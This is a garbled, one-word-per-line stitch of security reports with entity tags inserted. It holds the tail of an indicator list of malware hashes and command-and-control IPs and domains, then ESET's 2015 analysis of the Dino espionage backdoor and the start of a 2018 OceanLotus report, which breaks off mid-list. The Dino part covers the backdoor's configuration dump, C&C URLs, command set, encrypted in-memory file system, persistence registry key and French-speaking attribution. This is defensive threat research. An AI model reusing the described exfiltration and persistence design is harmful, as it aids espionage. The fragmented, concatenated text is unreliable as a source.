B4A94A214FC664B8D184154431E1C5A73CA0AE63  B_hash

Trojan.Win32/Spy.Sekur
C2
servers
:
weekend-service.com:80  B_url.unknown
seven-sky.org:80  B_url.unknown
comixed.org:80  B_url.unknown
91.207.60.68:80 B_ip.unknown
89.144.14.65:80 B_ip.unknown
87.98.217.9:443 B_ip.unknown
82.163.78.188:443 B_ip.unknown
50.62.171.62:700 B_ip.unknown
31.3.155.123:443 B_ip.unknown
216.170.116.120:80 B_ip.unknown
216.170.116.120:700 B_ip.unknown
216.170.116.120:443 B_ip.unknown
194.146.180.58:80 B_ip.unknown
193.203.48.41:700 B_ip.unknown
185.29.9.28:443 B_ip.unknown
178.209.50.245:443 B_ip.unknown
162.221.183.11:80 B_ip.unknown
162.221.183.11:443 B_ip.unknown
162.221.183.109:443 B_ip.unknown
141.255.167.28:443 B_ip.unknown
104.232.32.62:443 B_ip.unknown
104.232.32.61:443 B_ip.unknown

Trojan.Win32/Spy.Agent.ORM B_malware.infosteal
SHA-1
:
2DD485729E0402FD652CF613E172EA834B5C9077  B_hash
5E8B566095FD6A98949EF5C479CE290F520DD9E2  B_hash
8C2C08111F76C84C7573CF07C3D319A43180E734  B_hash
36093A6004A9502079B054041BADC43C69A0BDEB  B_hash
6F452C76F7AC00FE1463314F5AA0A80EC4F7360C  B_hash
850E9A10E6D20D33C8D2C765E22771E8919FC3EE  B_hash
A09F520DDED0D5292A5FA48E80DE02F9AF718D06  B_hash
3707029DC5CBBE17FD4DE34134847F92E7324C45  B_hash
905D0842CC246A772C595B8CF4A4E9E517683EB7  B_hash
237784574AFB8868213C900C18A114D3FA528B95  B_hash
6090853934833D0814F9239E6746161491CCCB44  B_hash

13/15

3672C9F4E7F647F2AF9AE6D5EA8D9C7FF16FAF40  B_hash
EC5DADAACAE763D0E55CE6A78C9A5F57B01A5135  B_hash
4E8EE08FF4F8DC06AFF8DE2E476AFAFBA58BDC11  B_hash
A734193F550DDA5C1FFD9FEC3A0186A0A793449C  B_hash
EFC0555418A6ED641047D29178D0DA3AEFA7ADEB  B_hash
B79E6A21D8C2813EC2279727746BDB685180751A  B_hash
4DB58E7D0FCA8D6748E17087EB34E562B78E1FDE  B_hash
567749B4F2330F02DD181C6C0840191CEE2186D9  B_hash
3ACEA9477B219FC6B8C0A734E67339AE2EB2AA5B  B_hash
2896814E5F8860E620AC633AF53A55D9AA21F8C0  B_hash
84CC02B3C10306BFCECE8BF274B57475B056C6D6  B_hash
207FF65543DAC6D1D9F86DFFD891C507AD24018B  B_hash
D627DD4E3850CBD571AFC4799A331054C7080B0D  B_hash
DCC932B878B374D47540D43A2DEE97F37D68267F  B_hash
983D33F547588A59B53D7F794768B264454446D5  B_hash
19E7C7A78C5D58945B615D98FF0990389485933F  B_hash
DED83A1E3B6630D69077976CC01321FBC946DCE2  B_hash
170142C042BF32FF86AF680EAD86CD1AF075B0CB  B_hash
A77336620DF96642691C1E5B6C91511BFA76A5BE  B_hash
3CEF1CA36A78CBA308FB29A46B20E5CA22D03289  B_hash
DD01331ABFF03525506CDCBAC4D76CB4EFD602A4  B_hash

RTF-exploits
SHA-1
:
1F9462AA39645376C74566D55866F7921BD848F7  B_hash
81E43D653ACD2B55C8D3107E5B50007870D84D76  B_hash
AC68AD2E5F5802A6AB9E7E1C1EC7FAB3C6BDBAA4  B_hash
F869C7EA683337A2249908C21B9D3283CC2DD780  B_hash
7162BB61CD36ED8B7EE98CBD0BFFEC33D34DD3E7  B_hash
5943ABCF662DC9634B714B1358164B65E5651D15  B_hash
A40BDF005B4B469D2C7BED1766C9DA9823E1CFB7  B_hash
833A8D88BE11807BAE966D56B28AF7B3CC34DBCD  B_hash
AF7564EE7959142C3B0D9EB8129605C2AE582CB7  B_hash
DCC932B878B374D47540D43A2DEE97F37D68267F  B_hash
6FF3AE5BA4E9A312602CBD44A398A02AB0437378  B_hash
32AA4911BC6AB8098E496CD88790FF7147EC6AC3  B_hash

Trojan.Win32/Spy.Agent.ORM B_malware.infosteal
–
C2
Servers
:
192.52.166.66 B_ip.unknown

14/15

84.200.4.226 B_ip.unknown
78.128.92.117 B_ip.unknown
176.31.157.62 B_ip.unknown
clients4-google.com B_url.unknown
(
192.169.82.86 B_ip.unknown
)
adobe-dns-3-adobe.com B_url.unknown
(
78.128.92.112 B_ip.unknown
)
img.in-travelusa.com B_url.unknown
(
192.169.82.86 B_ip.unknown
)

Tiny  B_malware.backdoor
meterpreter I
SHA-1
:
28D514FE46D8B5720FE27C40C3889F3B45967CC7  B_hash
0B0884992F28A3C1439DBA60007076B22831CE51  B_hash

Win32/Wemosis B_malware.backdoor
(
PoS
RAM
Scraper
)
SHA-1
:
5E31DB305A97736C0F419A3F2F8F093FF6A1F56F  B_hash

Win32/Wemosis B_malware.backdoor
–
C2
server
:
198.100.119.14  B_ip.unknown

Author
Anton
Cherepanov
,
ESET

15/15
Security
news
,
views
and
insight
from
the
ESET
experts

Dino B_malware.backdoor
–
the
latest
spying
malware
from
an
allegedly
French
espionage
group
analyzed

BY
JOAN
CALVET
POSTED
30
JUN
2015
­
11:12AM

In
this
blog
we
describe
a
sophisticated
backdoor
,
called
Dino B_malware.backdoor
by
its
creators
.

We
believe
this
malicious
software
has
been
developed
by
the
Animal
Farm
espionage
group
,
who
also
created
the
infamous
Casper B_malware.unknown
,
Bunny B_malware.unknown
and
Babar B_malware.unknown
malware
.

Dino B_malware.backdoor
contains
interesting
technical
features
,
and
also
a
few
hints
that
the
developers
are
French
speaking
.

Animal
Farm
is
the
security
industry's
name
for
a
group
of
attackers
first
described
by
Canada's
Communications
Security
Establishment
(
CSE
)
in
a
set
of
slides
leaked
by
Edward
Snowden
in
March
2014
.

In
those
slides
CSE
assess
with
'
moderate
certainty
'
that
this
group
is
a
French
intelligence
agency
.

Since
then
,
several
examples
of
malware
created
by
Animal
Farm
have
been
found
and
publicly
documented
,
in
particular
:

Casper B_malware.unknown
,
a
stealthy
first­stage
implant
,
documented
by
ESET
in
last
March

Bunny B_malware.unknown
,
a
Lua­based
backdoor
,
documented
by
Marion
Marschalek
(
Cyphort
)

Babar B_malware.unknown
,
an
espionage
platform
,
also
analyzed
by
Marion
Marschalek

The
connection
between
those
pieces
of
malware
and
the
group
described
in
CSE
slides
has
been
convincingly
established
,
for
example
by
Paul
Rascagnères
(
G
Data
)
.

In
this
blog
post
we
add
a
new
piece
to
the
puzzle
with
Dino B_malware.backdoor
,
another
malicious
program
belonging
to
Animal
Farm's
arsenal
.

Introduction

The
sample
of
Dino B_malware.backdoor
documented
in
this
blog
post
was
used
in
2013
against
targets
in
Iran
.

The
original
means
of
infection
is
unknown
,
though
we
believe
Dino B_malware.backdoor
was
installed
by
another
program
,
as
it
contains
an
uninstallation
command
without
the
corresponding
installation
procedure
.

Given
the
set
of
commands
it
can
receive
,
Dino's B_malware.backdoor
main
goal
seems
to
be
the
exfiltration
of
files
from
its
targets
.

The
binary's
original
name
,
'
Dino.exe
'
,
has
been
left
visible
by
its
authors
,
as
was
the
case
with
Casper B_malware.unknown
.

Dino  B_malware.backdoor
–
which
could
be
referring
to
the
pet
character
from
The
Flintstones
cartoon
show
–
was
already
mentioned
in
a
recent
Kaspersky
blog
as
a
'
full­featured
espionage
platform
,
'
but
no
technical
analysis
has
been
published
yet
.

Roughly
,
Dino B_malware.backdoor
can
be
described
as
an
elaborate
backdoor
built
in
a
modular
fashion
.

Among
its
technical
innovations
,
there
is
a
custom
file
system
to
execute
commands
in
a
stealthy
fashion
,
and
a
complex
task­
scheduling
module
working
in
a
similar
way
to
the
'
cron
'
Unix
command
.

Interestingly
,
the
binary
contains
a
lot
of
verbose
error
messages
,
allowing
us
to
see
Dino's  B_malware.backdoor
developers
'
choice
of
wording
.

Also
,
a
few
technical
artefacts
suggest
that
Dino B_malware.backdoor
was
authored
by
native
French
speakers
.

Dino B_malware.backdoor
Basics

Modules
List

Dino B_malware.backdoor
has
been
developed
in
C++
and
presents
a
well­defined
modular
architecture
.

The
following
array
lists
the
modules
contained
in
this
Dino B_malware.backdoor
binary;
the
module
names
are
those
assigned
by
the
developers
.

Module

Name

CORE

Module
Purpose

Encrypted
on
­disk
copy
for
Dino B_malware.backdoor
modules

Configuration
storage

CRONTAB

Task
scheduler

FMGR

File
upload
and
download
manager

Command
execution
manager

CMDEXEC

CMDEXECQ
Storage
queue
for
commands
to
execute

ENVVAR

Storage
for
environment
variables

Data
Structure

Dino B_malware.backdoor
heavily
relies
on
a
custom
data
structure
named
'
DataStore
'
by
the
Animal
Farm
developers
.

In
particular
,
all
Dino's  B_malware.backdoor
modules
store
their
content
inside
this
structure
,
making
its
understanding
one
of
the
keys
to
analyzing
Dino B_malware.backdoor
.

A
DataStore
is
a
map
from
string
keys
to
values
of
8
possible
types
,
such
as
integers
or
strings
.

The
implementation
of
this
data
structure
is
based
on
a
hash
table
.

It
means
that
to
retrieve
the
value
associated
with
a
key
,
one
has
to
calculate
the
hash
of
the
key
to
locate
a
bucket
from
which
the
value
can
be
retrieved
.

Dino's  B_malware.backdoor
hash
is
a
one­byte
value
calculated
with
a
series
of
XOR
operations
on
the
key
,
and
each
bucket
starts
a
linked
list
containing
key/value
pairs
.

The
code
responsible
for
retrieving
the
value
associated
with
a
key
is
shown
in
Figure
1
.

Figure
1

Finally
,
DataStore
objects
can
be
serialized
in
a
custom
format
,
which
begins
with
the
magic
word
'
DxSx
'
.

This
is
used
in
particular
by
the
PSM
module
to
save
the
content
of
Dino B_malware.backdoor
modules
in
an
encrypted
file
.

More
precisely
,
when
a
modification
is
made
to
a
module's
content
in
memory
,
the
PSM
module
saves
it
as
a
serialized
DataStore
.

When
Dino B_malware.backdoor
restarts
,
the
module
is
deserialized
from
the
file
and
loaded
into
memory
.

Funnily
enough
,
the
key
serving
to
encrypt
the
file
on
disk
is
'
PsmIsANiceM0du1eWith0SugarInside
'
.

Configuration

Dino's  B_malware.backdoor
configuration
is
initially
stored
in
a
serialized
DataStore
object
contained
in
a
zip
archive
at
the
end
of
the
Dino B_malware.backdoor
binary
.

At
runtime
this
object
is
deserialized
and
stored
inside
the
CORE
module
.

We
can
list
the
configuration's
content
with
Dino's  B_malware.backdoor
'
conf
–l
CORE
'
command
–
described
later
–
which
displays
on
separate
rows
each
key's
name
,
its
associated
value
and
the
type
of
this
value
:

Started:5523F782
QWORD

InitialWaitDone:00000001
DWORD

InteractiveDelay:00000005
DWORD

MaxNothingSaidCount:00000078
DWORD

InstallDate
:
5523F782
QWORD
fields:78537844...[REDACTED]...66B3900
BYTES
recID:11173­01­PRS
WIDESTR

Version:1.2
WIDESTR

BD_Keys
:
4D41474943424F58...[REDACTED]...9EB3506
BYTES

CC_Keys
:
4D41474943424F58...[REDACTED]...0000000
BYTES

MaxDelay:00000E10
DWORD

ComServer0:hXXp://www.azhar.bf/...[REDACTED].../postal.php
STR

ComServer1:hXXp://www.rsvniima.org/...[REDACTED].../din12/postal.php
STR

ComServer2:hXXp://www.azhar.bf/...[REDACTED].../postal.php
STR

ComServer3:hXXp://www.rsvniima.org/...[REDACTED].../din12/postal.php
STR

ComServer4:hXXp://dneprorudnoe.info//...[REDACTED].../postal.php
STR

ComServer5:hXXp://dneprorudnoe.info//...[REDACTED].../postal.php
STR

ComServer6:hXXp://dneprorudnoe.info//...[REDACTED].../postal.php
STR

NextSendReceive:5CC33097FB72D001
BYTES

CC:000064F7­72E4­3F7D­C817­474D­A9BDBDF7
STR

DaysOfLife:00000000
DWORD

GUID:12FEB4A9EEDEE411B283000C29FD2872
BYTES

InitialDelay:00000000
DWORD
now:5523F78E
QWORD
hash:A88E8181CA5CE35AE70C76145DFB820D
BYTES

InitialCommands:78537844...[REDACTED]...000000
BYTES
xT0rvwz:DC188352A...[REDACTED]...00000
BYTES
tr4qa589:K/[RAFtIP?ciD?:D
STR
jopcft4T:a.ini
WIDESTR

While
most
of
the
keys
have
self­explanatory
names
,
we
would
like
to
focus
on
the
following
keys
:

'
recID
'
:
Animal
Farms
binaries
contain
an
ID
whose
decimal
value
appears
to
identify
the
target
,
'
11173­01­
PRS
'
in
this
case
.

For
example
Casper B_malware.unknown
used
an
'
ID
'
value
set
to
'
13001
'
,
whereas
some
Babar B_malware.unknown
samples
used
'
12075­01
'
and
'
11162­01
'
.
We
do
not
know
the
meaning
of
the
'
PRS
'
suffix
added
in
the
case
of
Dino B_malware.backdoor
.

'
ComServer
'
:
These
keys
contain
the
command
and
control
(
C&C
)
servers
'
URLs
.

All
the
URLs
were
down
when
we
started
our
analysis
.
Those
C&Cs
were
compromised
legitimate
websites
,
which
is
standard
operating
procedure
for
Animal
Farm
.

'
Version
'
:
Dino's  B_malware.backdoor
code
version;
here
set
to
'
1.2
'
,
which
is
confirmed
by
the
'
din12
'
folder
used
in
one
of
the
C&C
URLs
.
For
the
record
,
a
'
d13
'
folder
has
been
seen
on
another
Animal
Farm
C&C
(
see
'
3.7
Calling
home
'
of
Marschalek's
Babar B_malware.unknown
report
)
,
indicating
that
Dino B_malware.backdoor
version
1.3
has
also
likely
been
deployed
at
some
point
.

'
BD_Keys
'
and
'
CC_Keys
'
contain
cryptographic
keys
to
encrypt
the
network
communications
with
C&C
servers
.

Their
values
start
with
the
word
'
MAGICBOX
'
.

The
three
last
keys
are
displayed
with
obfuscated
names
(
'
xT0rvwz
'
,
'
tr4qa589
'
and
'
jopcft4T
'
)
and
store
parameters
for
the
custom
file
system
we
will
describe
later
.

Commands

The
following
Table
lists
the
commands
accepted
by
this
Dino B_malware.backdoor
binary
with
the
names
chosen
by
the
developers
.

Each
of
those
commands
can
take
one
or
more
arguments
.

Command

sysinfo

killBD

conf

search

archive

unarchive

download

cancel

cancelall

cronadd

cronlist

crondel

wakeup

restart

showip

cominfos

comallinfos

wget

Purpose

Retrieve
reconnaissance
information
from
the
machine

Uninstall
Dino B_malware.backdoor
using
the
custom
file
system
(
see
ramFS
description
below
for
details
)

Execute
Windows
batch
command
passed
as
a
parameter

Change
the
current
work
directory

Retrieve
the
current
work
directory
path

List
files
in
a
given
directory
with
various
additional
information

Set
or
remove
environment
variables
stored
in
the
ENVVAR
module

Display
or
update
module
content

Search
for
files
whose
names
match
given
patterns
.

The
files
found
are
packed
in
an
archive
,
which
is
then
scheduled
for
upload
to
the
C&C
using
the
FMGR
module
.

Create
an
archive
from
given
file
paths

Unpack
an
archive
to
a
given
location

Schedule
a
file
transfer
to
the
C&C
using
the
FMGR
module

Remove
the
next
file
transfer
scheduled
in
the
FMGR
module

Remove
all
scheduled
file
transfers
in
the
FMGR
module

Schedule
a
command
to
be
executed
at
a
certain
time
by
the
CRONTAB
module
(
see
CRONTAB
description
below
for
details
)

List
registered
entries
in
the
CRONTAB
module

Remove
an
entry
in
the
CRONTAB
module

Schedule
a
wake­up
of
the
malware
after
a
certain
amount
of
time
using
the
CRONTAB
module

N/A
:
the
command
is
actually
not
implemented

Display
the
public
IP
of
the
infected
machine

Display
information
about
the
currently
used
C&C
server

Display
information
about
all
known
C&C
servers

Download
a
file
from
the
currently
used
C&C
server
onto
the
machine
delayttk

Delay
the
de­installation
of
the
malware
,
if
scheduled

One
command
of
particular
interest
is
'
search
'
,
which
allows
the
operators
to
look
for
files
very
precisely
.

For
example
,
it
can
provide
all
files
with
a
'
.doc
'
extension
,
the
size
of
which
is
bigger
than
10
kilobytes
,
and
that
were
modified
in
the
last
3
days
.

We
believe
this
exfiltration
of
files
to
be
Dino's  B_malware.backdoor
end
goal
.

At
startup
Dino  B_malware.backdoor
executes
successively
the
commands
stored
in
the
'
InitialCommands
'
field
in
its
configuration;
in
the
sample
we
analyzed
they
are
:

sysinfo
cominfos
!ipconfig
/all
!ipconfig
/displaydns
!tracert
www.google.com  B_url.normal

Those
commands
serve
as
a
reconnaissance
step
for
the
operators
.

Their
execution
is
managed
by
the

CMDEXEC
module
,
the
commands
being
stored
in
a
queue
inside
the
CMDEXECQ
module
.

The
result
is
reported
to
the
C&C
server
.

After
having
described
Dino's B_malware.backdoor
basics
,
we
are
now
going
to
dig
into
two
particularly
interesting
components;
first
,
a
custom
file
system
used
by
the
malware
,
and
then
the
CRONTAB
module
in
charge
of
task
scheduling
.

RamFS
:
A
Temporary
File
System

Dino B_malware.backdoor
contains
a
custom
file
system
named
'
ramFS
'
by
its
developers
.

It
provides
a
complex
data
structure
to
store
files
in
memory
,
each
of
them
bearing
a
name
corresponding
to
filenames
used
by
usual
file
systems
.

RamFS
also
comes
with
a
set
of
custom
commands
that
can
be
stored
in
files
and
executed
.

It
should
be
noticed
that
ramFS
is
also
present
in
other
Animal
Farm
binaries
(
see
attribution
paragraph
below
)
,
but
since
we
are
unaware
of
previous
analysis
of
ramFS
,
we
are
describing
our
findings
here
.

Architecture

RamFS
content
is
initially
stored
encrypted
in
Dino's  B_malware.backdoor
configuration
under
the
key
'
xT0rvwz
'
,
whereas
the
corresponding
RC4
key
is
stored
under
the
key
'
tr4qa589
'
.
Once
the
file
system
has
been
decrypted
,
it
is
stored
in
memory
as
a
linked
list
of
512­byte
memory
chunks
,
each
one
of
them
being
individually
RC4­
encrypted
.

When
looking
for
a
file
in
ramFS
,
each
chunk
is
decrypted
,
processed
and
then
re­encrypted
.

Hence
there
are
very
few
noticeable
traces
of
ramFS
during
its
use
.

Here
are
some
high­level
characteristics
of
this
file
system
:

File
names
and
file
content
are
encoded
in
Unicode

File
names
length
is
limited
to
260
characters

Once
decrypted
,
file
content
is
manipulated
as
chunks
of
540
bytes

There
is
no
metadata
associated
with
the
files

We
could
not
find
an
existing
file
system
matching
the
memory
structures
and
the
characteristics
of
ramFS
,
and
therefore
we
believe
this
file
system
to
be
an
original
creation
of
the
Animal
Farm
group
.

Commands

Several
commands
can
be
executed
in
the
context
of
ramFS
,
as
listed
in
the
following
Table
.

Command

INSTALL

EXTRACT

DELETE

EXEC

INJECT

SLEEP

KILL

AUTODEL

Meaning

Change
the
current
work
directory
on
the
real
file
system

N/A
:
the
command
is
actually
not
implemented

Installation
or
de­installation
of
Dino B_malware.backdoor
,
in
Windows
registry
and/or
as
a
service

Extracts
a
file
stored
in
ramFS
onto
the
machine

Deletes
a
file
stored
on
the
machine

Executes
a
file
stored
in
ramFS

Injects
a
file
stored
in
ramFS
into
a
running
process

Sleeps
for
a
given
amount
of
time

Terminates
a
running
process

N/A
:
the
command
is
actually
not
implemented

Usage
of
ramFS
in
Dino B_malware.backdoor

In
the
case
of
Dino B_malware.backdoor
,
ramFS
serves
as
protected
storage
for
one
specific
file
containing
the
instructions
to
remove
the
malware
from
the
machine
.

The
developers
named
this
file
the
'
cleaner
'
and
it
is
executed
when
Dino B_malware.backdoor
receives
the
command
'
killBD
'
(
the
'
BD
'
acronym
is
the
developers
'
designation
of
the
malware
)
.

Figure
2
shows
the
code
responsible
for
executing
this
cleaner
file
.

First
,
it
retrieves
the
name
of
the
file
from
Dino's  B_malware.backdoor
configuration
(
'
a.ini
'
)
,
then
it
retrieves
the
key
to
decrypt
ramFS
,
and
it
finally
mounts
the
file
system
in
memory
in
order
to
execute
the
cleaner
file
stored
inside
.

The
verbosity
of
the
error
messages
makes
it
particularly
easy
to
understand
the
purpose
of
the
code
.

Figure
2

The
cleaner
file
contains
the
string
'
INSTALL
­A
'
wusvcd
'
­U
'
which
,
once
executed
,
will
uninstall
the
malware
from
the
machine
–
'
wusvcd
'
being
the
name
used
to
register
Dino B_malware.backdoor
on
the
machine
.

Hence
,
ramFS
serves
as
a
protected
container
for
files
to
be
executed
on
the
machine
,
offering
a
disposable
execution
environment
to
the
operators
and
leaving
very
few
traces
on
the
system
.

Tasks
scheduling
in
a
Unix
fashion

The
commands
'
cronadd
'
,
'
cronlist
'
and
'
crondel
'
serve
respectively
to
add
,
list
,
and
remove
scheduled
tasks
registered
in
the
CRONTAB
module
.

Those
tasks
are
Dino's  B_malware.backdoor
commands
.

The
syntax
to
define
scheduled
tasks
is
similar
to
the
one
used
by
the
cron
Unix
command
.

In
particular
the
time
at
which
to
run
a
command
is
given
by
a
string
following
the
format
'
minute
hour
day
month
year
dayofweek
'
.

Alternatively
,
this
string
can
be
replaced
by
'
@boot
'
for
a
command
to
run
at
each
startup
–
whereas
some
Unix
cron
implementations
accept
'
@reboot
'
.

As
an
example
,
here
is
the
output
of
the
'
cronlist
'
command
after
a
'
wakeup
'
command
has
been
scheduled
to
run
on
7th
April
2015
at
15:44
:

As
we
can
see
,
each
entry
is
identified
by
an
'
Id
'
,
an
incrementing
hexadecimal
number
starting
at
0xC0
.

The
purpose
of
the
'
Local
'
field
remains
unclear
(
the
other
possible
value
being
'
­l
'
)
.
The
'
Count
'
parameter
counts
the
number
of
times
a
command
has
been
executed
,
'
­1
'
indicating
the
command
will
be
executed
only
once
.

Finally
,
the
'
Visibility
'
field
defines
whether
the
command
execution
will
be
reported
to
the
C&C
(
the
other
possible
value
being
'
Silent
'
)
.

Attribution

Dino B_malware.backdoor
Belongs
To
The
Farm
The
amount
of
shared
code
between
Dino B_malware.backdoor
and
known
Animal
Farm
malware
leaves
very
little
doubt
that
Dino B_malware.backdoor
belongs
to
Animal
Farm's
arsenal
.

Among
these
shared
features
,
we
can
cite
the
following
:

At
the
very
beginning
of
Dino B_malware.backdoor
execution
,
the
current
process
name
is
checked
against
process
names
used
by
some
sandboxes
:

Figure
3

A
very
similar
check
(
against
'
klavme
'
,
'
myapp
'
,
'
TESTAPP
'
and
'
afyjevmv.exe
'
)
is
present
in
Bunny B_malware.unknown
samples
,
and
in
some
first­stage
implants
deployed
by
Animal
Farm
.

To
hide
its
calls
to
certain
API
functions
,
Dino B_malware.backdoor
employs
a
classic
Animal
Farm
ploy
:
a
hash
is
calculated
from
the
function's
name
and
used
to
look
for
the
address
of
the
API
function
.

The
actual
hashing
algorithm
used
in
Dino B_malware.backdoor
is
the
same
that
was
used
in
Casper B_malware.unknown
,
namely
a
combination
of
rotate­left
(
ROL
)
of
7
bits
and
exclusive­or
(
XOR
)
operations
.

The
Dino's  B_malware.backdoor
custom
file
system
–
the
so­called
ramFS
–
is
present
in
several
droppers
used
by
Animal
Farm
.

In
those
binaries
the
file
system
serves
to
set
the
persistence
of
the
payload
.

For
example
,
here
is
the
command
executed
by
some
NBOT  B_malware.drop
droppers
in
the
context
of
ramFS
:

As
a
final
indication
that
Dino B_malware.backdoor
belongs
to
Animal
Farm
menagerie
,
it
is
noticeable
that
the
output
of
Dino's B_malware.backdoor
sysinfo
command
looks
like
an
updated
version
of
the
'
beacon
'
from
the
SNOWBALL
implant
described
in
the
leaked
CSE
slides
–
part
of
operation
SNOWGLOBE
,
which
led
to
the
discovery
of
Babar B_malware.unknown
:

Dino's  B_malware.backdoor
sysinfo
example
output

Login/Domain
(
owner
)
:
Administrator/JOHN
(
john
)

Computer
name
:
JOHN

Organization
(
country
)
:
(
United
States
)

RecId
:
11173­01­PRS

MaxDelay
:
3600

Version
:
1.2

OS
version
(
SP
)
:
5.1
(
Service
Pack
3
)

WOW64
:
No

Default
browser
:
firefox.exe

IE
version
:
Mozilla/4.0
(
compatible;
MSIE
7.0;
Win32
)

First
launch
:
04/01/2015
–
18:31:14

Time
to
kill
:
N/A

Last
launch
:
04/01/2015
–
19:21:44

Mode
:
N/A
|
Rights
:
Admin
|
UAC
:
No

ID
:
4635BEF0­D89D­11E4­B283­000C­29FD2872

InstallAv
:
0

Inj
:
Yes

SNOWBALL
implant
beacon

All
these
indicators
together
make
us
very
confident
that
Dino B_malware.backdoor
was
developed
by
the
Animal
Farm
group
.

French
speaking
Developers

Dino B_malware.backdoor
adds
at
least
two
more
indicators
to
those
already
documented
suggesting
that
Animal
Farm
developers
are
French
speaking
:

Dino's  B_malware.backdoor
binary
contains
a
resource
whose
language
code
value
is
1036
.

The
original
purpose
of
this
language
code
is
to
allow
developers
to
provide
resources
(
menus
,
icons
,
version
information
...
)
for
different
locations
in
the
world
in
the
corresponding
language
.

Interestingly
,
when
a
developer
does
not
manually
specify
the
language
code
,
the
compiler
sets
it
to
the
language
of
the
developer's
machine
.

So
,
which
language
corresponds
to
the
value
1036
,
or
0x40c
in
hexadecimal
?
French
(
France
)
.

Of
course
a
non­French
speaking
developer
could
have
deliberately
set
this
value
to
mislead
attribution
efforts
.

But
in
more
recent
Animal
Farm
binaries
(
for
example
Casper B_malware.unknown
)
,
this
language
code
has
been
set
to
the
classical
English
(
USA
)
language
code
.

Therefore
,
it
seems
that
Animal
Farm
developers
forgot
to
set
this
value
in
their
first
creations
,
realized
their
mistake
at
some
point
,
and
decided
to
set
a
standard
value
.

Someone
using
the
language
code
as
a
false
flag
would
have
likely
kept
the
strategy
going
.

For
the
record
,
this
Dino B_malware.backdoor
sample
is
not
the
only
Animal
Farm
binary
with
1036
as
language
code
.

Dino's  B_malware.backdoor
binary
is
statically
linked
with
the
GnuMP
library
,
which
is
used
to
manipulate
big
numbers
in
cryptography
algorithms
.

The
GnuMP
code
in
Dino B_malware.backdoor
contains
file
paths
coming
from
the
developer's
machine
:
..\..\src\arithmetique\mpn\mul.c
..\..\src\arithmetique\printf\doprnt.c
..\..\src\arithmetique\mpn\tdiv_qr.c
..\..\src\arithmetique\mpn\mul_fft.c
..\..\src\arithmetique\mpn\get_str.c

As
the
attentive
reader
has
probably
guessed
,
'
arithmetique
'
is
the
French
translation
of
'
arithmetic
'
.

Conclusion

Dino's  B_malware.backdoor
binary
shows
an
intense
development
effort
,
from
custom
data
structures
to
a
homemade
file
system
.

As
with
other
Animal
Farm
binaries
,
it
bears
the
mark
of
professional
and
experienced
developers
.

But
Dino B_malware.backdoor
also
shows
a
poor
knowledge
,
or
interest
,
from
these
developers
in
anti­analysis
techniques
–
contrary
to
what
was
seen
in
Casper B_malware.unknown
–
as
demonstrated
,
for
example
,
by
the
verbosity
of
some
Dino's  B_malware.backdoor
log
messages
:

All
those
messages
provide
substantial
help
in
understanding
Dino's  B_malware.backdoor
internal
workings
.

One
will
also
appreciate
the
numerous
misspellings
contained
in
the
messages
.

Regarding
Dino's  B_malware.backdoor
victims
,
we
know
very
little
except
that
they
were
located
in
Iran
in
2013
.

This
is
in
accordance
with
the
victimology
described
by
Canada's
CSE
in
its
presentation
:

That
leads
us
to
the
final
point
of
this
blog
:
several
signs
suggest
that
Dino's  B_malware.backdoor
creators
are
French
speaking
developers
.

These
signs
add
to
the
pretty
long
list
of
indicators
already
supporting
this
hypothesis
,
in
particular
the
ones
mentioned
by
Canada's
CSE
.

Indicators
of
Compromise

Value

BF551FBDCF5A982705C01094436883A6AD3B75BD   B_hash

hXXp://www.azhar.bf/modules/mod_search/found/cache/postal.php B_url.cncsvr

hXXp://www.rsvniima.org/templates/rsv/icons/din12/postal.php B_url.cncsvr

hXXp://dneprorudnoe.info/sxd/lang/i18n/charcodes/postal.php B_url.cncsvr

C:\Program
Files\Common
Files\wusvcd\wusvcd.exe

C:\Program
Files\Common
Files\wusvcd\wusvcd00000000­0000­
0000­0000­0000­00000000.{dax,dat,lck}
.tmp_dwn

Software\Microsoft\Windows\Windows\CurrentVersion\Run\wusvcd

Indicator

Sample
SHA1

C&C
URL

C&C
URL

C&C
URL

Path

Default
storage
file
names

Downloaded
file
name
extension

Registry
key

Author
Joan
Calvet
,
ESET
OceanLotus

Old
techniques
,
new
backdoor

ESET

March
2018

OceanLotus

Old
techniques
,
new
backdoor

ESET

March
2018

TABLE
OF
CONTENT

OceanLotus
:
old
techniques
,
new
backdoor

Distribution

Double
extension
and
fake
icon
applications
(
Word
,
PDF
,
etc
)

Fake
installers

Technical
analysis

Execution
flow
overview

A
quick
word
on
control
flow
obfuscation

The
Dropper

Backdoor
component
:
rastlsc.exe
side-loading

Communication

Commands

Conclusion

IoCs

Samples B_hash

Network B_ip.unknown

LIST
OF
FIGURES

Figure
1

Figure
2

Figure
3

Figure
4

Figure
5

Figure
6

Figure
7

Figure
8

Figure
9

Figure
10

Figure
11

Dropper
execution
flow

Backdoor
execution
flow

Complementary
conditional
jump

PUSH/JMP
technique

Control
flow
obfuscation

RobototFontUpdate
icon

Symantec
rastlsc.exe
digital
signature

All
rasltls.dll
exports
lead
to
the
same
function

Generated
shellcode

Configuration
structure

System
fingerprint

LIST
OF
TABLES

Table
1
.

Table
2
.

Initial
Dropper

Sideloaded
libraries

OCEANLOTUS
:
OLD
TECHNIQUES
,
NEW
BACKDOOR

The
OceanLotus
group
,
also
known
as
APT32
and
APT-C-00
,
is
infamous
for
its
campaigns
targeting
the
eastern
part
of
Asia
.

A
great
deal
of
research
about
this
group
was
published
last
year
,
including
papers
such
as
those
from
CyberReason
,
a
lengthy
global
view
from
FireEye
and
the
watering-hole
explanation
from
Volexity
.

We
see
that
this
group
keeps
updating
their
backdoors
,
infrastructure
,
and
infection
vectors
.

OceanLotus
continues
its
activity
particularly
targeting
company
and
government
networks
in
East-Asian
countries
.

A
few
months
ago
,
we
discovered
and
analyzed
one
of
their
latest
backdoors
.

Several
tricks
are
being
used
to
convince
the
user
to
execute
the
backdoor
,
to
slow
down
its
analysis
and
to
avoid
detection
.

These
techniques
will
be
discussed
in
detail
in
this
blog
post
.

Distribution

Various
methods
are
used
to
trick
potential
victims
into
running
the
malicious
dropper
.

Our
telemetry
reveals
that
East-Asian
countries
such
as
Vietnam
,
the
Philippines
,
Laos
and
Cambodia
,
are
the
most
targeted
.

Double
extension
and
fake
icon
applications
(
Word
,
PDF
,
etc
)

The
droppers
are
probably
attached
to
an
email
message
.

Some
file
names
we
have
seen
include
:

•
Mi17
Technical
issues
-
Phonesack
Grp.exe
.
Mi-17
is
a
common
Russian
helicopter
.

•
Chi
tiet
don
khieu
nai
gui
saigontel.exe
,
which
translates
from
Vietnamese
to
'
Details
of
the
complaint
sent
to
Saigontel
'
.
Saigontel
is
a
telecommunication
company
in

Vietnam
.

•
Updated
AF
MOD
contract
